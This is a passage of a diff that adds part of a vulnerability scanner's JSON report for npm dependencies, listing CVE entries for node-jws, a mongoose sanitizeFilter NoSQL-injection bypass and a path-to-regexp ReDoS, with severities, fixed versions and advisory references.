+          "CweIDs": [
+            "CWE-347"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2025-65945",
+            "https://github.com/auth0/node-jws",
+            "https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e",
+            "https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6",
+            "https://github.com/auth0/node-jws/releases/tag/v3.2.3",
+            "https://github.com/auth0/node-jws/releases/tag/v4.0.1",
+            "https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-65945",
+            "https://www.cve.org/CVERecord?id=CVE-2025-65945"
+          ],
+          "PublishedDate": "2025-12-04T19:16:05.55Z",
+          "LastModifiedDate": "2026-06-17T09:56:06.31Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42334",
+          "PkgID": "mongoose@7.8.7",
+          "PkgName": "mongoose",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/mongoose@7.8.7",
+            "UID": "fffd163dde3433ba"
+          },
+          "InstalledVersion": "7.8.7",
+          "FixedVersion": "6.13.9, 7.8.9, 8.22.1, 9.1.6",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42334",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "Mongoose's Improper Sanitization of $nor in sanitizeFilter May Allow NoSQL Injection",
+          "Description": "Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment. Prior to 6.13.9, 7.8.9, 8.22.1, and 9.1.6, a vulnerability allows bypassing Mongoose’s sanitizeFilter query sanitization mechanism via the $nor operator. When sanitizeFilter is enabled, Mongoose wraps query operators in $eq to neutralize them. However, prior to the fix, $nor was not included in the set of logical operators that are recursively sanitized. Because $nor accepts an array (like $and and $or), and arrays do not trigger hasDollarKeys(), malicious operators such as $ne, $gt, or $regex could be injected inside a $nor clause without being sanitized. This vulnerability is fixed in 6.13.9, 7.8.9, 8.22.1, and 9.1.6.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-74"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/Automattic/mongoose",
+            "https://github.com/Automattic/mongoose/security/advisories/GHSA-wpg9-53fq-2r8h",
+            "https://mongoosejs.com/docs/api/mongoose.html#Mongoose.prototype.sanitizeFilter()",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42334",
+            "https://thecodebarbarian.com/whats-new-in-mongoose-6-sanitizefilter.html"
+          ],
+          "PublishedDate": "2026-05-14T18:16:47.747Z",
+          "LastModifiedDate": "2026-06-17T10:47:42.1Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-4867",
+          "PkgID": "path-to-regexp@0.1.12",
+          "PkgName": "path-to-regexp",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/path-to-regexp@0.1.12",
+            "UID": "2af6497c271f0c47"
+          },
+          "InstalledVersion": "0.1.12",
+          "FixedVersion": "0.1.13",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-4867",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "path-to-regexp: path-to-regexp: Denial of Service via catastrophic backtracking from malformed URL parameters",
+          "Description": "Impact:\n\nA bad regular expression is generated any time you have three or more parameters within a single segment, separated by something that is not a period (.). For example, /:a-:b-:c or /:a-:b-:c-:d. The backtrack protection added in path-to-regexp@0.1.12 only prevents ambiguity for two parameters. With three or more, the generated lookahead does not block single separator characters, so capture groups overlap and cause catastrophic backtracking.\n\nPatches:\n\nUpgrade to path-to-regexp@0.1.13\n\nCustom regex patterns in route definitions (e.g., /:a-:b([^-/]+)-:c([^-/]+)) are not affected because they override the default capture group.\n\nWorkarounds:\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change /:a-:b-:c to /:a-:b([^-/]+)-:c([^-/]+).\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1333"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+              "V3Score": 5.3
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-4867",
+            "https://blakeembrey.com/posts/2024-09-web-redos",
+            "https://cna.openjsf.org/security-advisories.html",
+            "https://github.com/advisories/GHSA-9wv6-86v2-598j",
+            "https://github.com/pillarjs/path-to-regexp",
+            "https://github.com/pillarjs/path-to-regexp/releases/tag/v.0.1.13",
+            "https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-37ch-88jc-xwx2",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-4867",
+            "https://www.cve.org/CVERecord?id=CVE-2026-4867"
+          ],
+          "PublishedDate": "2026-03-26T17:16:42.983Z",
+          "LastModifiedDate": "2026-06-17T10:57:21.827Z"
+        }
+      ]
+    }
+  ]
+}
